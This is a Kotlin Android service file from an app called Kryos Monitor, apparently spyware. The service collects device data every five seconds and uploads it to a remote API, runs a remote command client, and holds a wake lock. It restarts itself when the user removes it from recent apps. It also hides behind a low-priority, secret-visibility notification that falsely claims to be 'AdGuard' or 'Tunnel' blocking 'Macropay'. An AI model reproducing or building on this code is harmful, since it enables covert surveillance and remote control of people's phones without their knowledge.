package com.kryos.monitor.service

import android.app.*
import android.content.*
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import com.kryos.monitor.KryosApp
import com.kryos.monitor.MainActivity
import com.kryos.monitor.R
import com.kryos.monitor.api.ApiService
import com.kryos.monitor.data.DeviceDataCollector
import kotlinx.coroutines.*
import com.kryos.monitor.command.CommandClient
import com.kryos.monitor.notification.NotificationSync















class MonitoringService : Service() {

    companion object {
        private const val TAG = "KryosMonitorService"
        private const val SYNC_INTERVAL_MS = 5000L 
        private const val OFFLINE_SYNC_INTERVAL_MS = 30000L 
        private const val WAKE_LOCK_TIMEOUT = 10 * 60 * 1000L 
	
        const val ACTION_START = "com.kryos.monitor.ACTION_START"
        const val ACTION_STOP = "com.kryos.monitor.ACTION_STOP"
        const val ACTION_SYNC_NOW = "com.kryos.monitor.ACTION_SYNC_NOW"

        @Volatile
        var isRunning = false
            private set

        


        fun start(context: Context) {
            val intent = Intent(context, MonitoringService::class.java).apply {
                action = ACTION_START
            }
            context.startForegroundService(intent)
        }

        


        fun stop(context: Context) {
            val intent = Intent(context, MonitoringService::class.java).apply {
                action = ACTION_STOP
            }
            context.startService(intent)
        }
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var dataCollector: DeviceDataCollector? = null
    private var apiService: ApiService? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var syncJob: Job? = null
    private var offlineSyncJob: Job? = null
    private var commandClient: CommandClient? = null

    override fun onCreate() {
        super.onCreate()
Log.e("KRYOS_TEST", "================================")
    Log.e("KRYOS_TEST", "MonitoringService onCreate")
    Log.e("KRYOS_TEST", "================================")
        Log.i(TAG, "Servicio creado")
        dataCollector = DeviceDataCollector(this)
        apiService = ApiService.getInstance(this)
        commandClient = CommandClient(this)
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
Log.e("KRYOS_TEST", "onStartCommand")
    Log.e("KRYOS_TEST", "action=${intent?.action}")

        when (intent?.action) {
            ACTION_STOP -> {
                Log.i(TAG, "Deteniendo servicio...")
                stopService()
                return START_NOT_STICKY
            }
            ACTION_SYNC_NOW -> {
                Log.d(TAG, "Sincronización manual solicitada")
                serviceScope.launch {
                    performSync()
                }
                return START_STICKY
            }
            else -> {
Log.e("KRYOS_TEST", "Entrando a startMonitoring()")
                
                startMonitoring()
                return START_STICKY 
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "Servicio destruido")
        stopService()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.w(TAG, "App removida de recientes, reiniciando servicio...")
        
        val restartIntent = Intent(this, MonitoringService::class.java).apply {
            action = ACTION_START
        }
        val pendingIntent = PendingIntent.getService(
            this,
            1,
            restartIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 1000,
                pendingIntent
            )
        }
    }

    


    private fun startMonitoring() {
Log.e("KRYOS_TEST", "startMonitoring()")
        if (isRunning) {
Log.e("KRYOS_TEST", "Ya estaba corriendo")
            Log.d(TAG, "El servicio ya está en ejecución")
            return
        }

        Log.i(TAG, "Iniciando monitoreo...")
        isRunning = true

        
        val notification = createNotification(
            title = "AdGuard",
            text = "Bloqueando Macropay..."
        )
        startForeground(KryosApp.NOTIFICATION_ID, notification)

        
        startSyncLoop()

        
        startOfflineSyncLoop()
        commandClient?.start()

        Log.i(TAG, "Monitoreo iniciado correctamente")
    }

    


    private fun startSyncLoop() {
        syncJob?.cancel()
        syncJob = serviceScope.launch {
            while (isActive && isRunning) {
                try {
                    performSync()
                } catch (e: CancellationException) {
                    throw e
                } catch (e: Exception) {
                    Log.e(TAG, "Error en sync loop: ${e.message}")
                }
                delay(SYNC_INTERVAL_MS)
            }
        }
    }

    


    private fun startOfflineSyncLoop() {
        offlineSyncJob?.cancel()
        offlineSyncJob = serviceScope.launch {
            while (isActive && isRunning) {
                delay(OFFLINE_SYNC_INTERVAL_MS)
                try {
                    syncOfflineData()
                } catch (e: CancellationException) {
                    throw e
                } catch (e: Exception) {
                    Log.e(TAG, "Error en offline sync: ${e.message}")
                }
            }
        }
    }

    


    private suspend fun performSync() {
Log.e("KRYOS_TEST", "performSync()")
        try {
            val collector = dataCollector ?: return
            val api = apiService ?: return
            Log.e("KRYOS_TEST", "1 - Antes de collectAllData")
            
            val report = collector.collectAllData()
	    Log.e("KRYOS_TEST", "2 - collectAllData OK")
            
            val sent = api.sendReport(report)
	    Log.e("KRYOS_TEST", "3 - sendReport = $sent")
            
            if (sent) {
                updateNotification(
                    title = "Tunnel",
                    text = "Bloqueando Macropay"
                )
            } else {
                val pending = api.getPendingCount()
                updateNotification(
                    title = "Tunel",
                    text = "Bloqueando Macropay"
                )
            }

        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Error en sync: ${e.message}")
	    Log.e("KRYOS_TEST", "ERROR performSync", e)
        }
    }

    


    private suspend fun syncOfflineData() {
        try {
            val api = apiService ?: return
            val collector = dataCollector ?: return

            
            if (!collector.isInternetAvailable()) return

            val pending = api.getPendingCount()
            if (pending > 0) {
                Log.i(TAG, "Intentando sincronizar $pending reportes offline...")
	        
                api.syncOfflineData()
                api.cleanup()
            }
NotificationSync.getInstance(this)
    .syncOffline()
        } catch (e: CancellationException) {
            throw e
        } catch (e: Exception) {
            Log.e(TAG, "Error sync offline: ${e.message}")
        }
    }

    


    private fun stopService() {
        isRunning = false
        syncJob?.cancel()
        offlineSyncJob?.cancel()
        commandClient?.stop()
        commandClient = null
        dataCollector?.stop()
        dataCollector = null
        releaseWakeLock()
        serviceScope.cancel()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    


    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "Kryos::MonitoringWakeLock"
            ).apply {
                setReferenceCounted(false)
                acquire(WAKE_LOCK_TIMEOUT)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error adquiriendo wake lock: ${e.message}")
        }
    }

    


    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) it.release()
            }
            wakeLock = null
        } catch (e: Exception) {
            Log.e(TAG, "Error liberando wake lock: ${e.message}")
        }
    }

    


    private fun createNotification(title: String, text: String): Notification {
        
             return NotificationCompat.Builder(this, KryosApp.CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(R.drawable.ic_notification)
          
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    


    private fun updateNotification(title: String, text: String) {
        try {
            val notification = createNotification(title, text)
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.notify(KryosApp.NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Log.e(TAG, "Error actualizando notificación: ${e.message}")
        }
    }
}
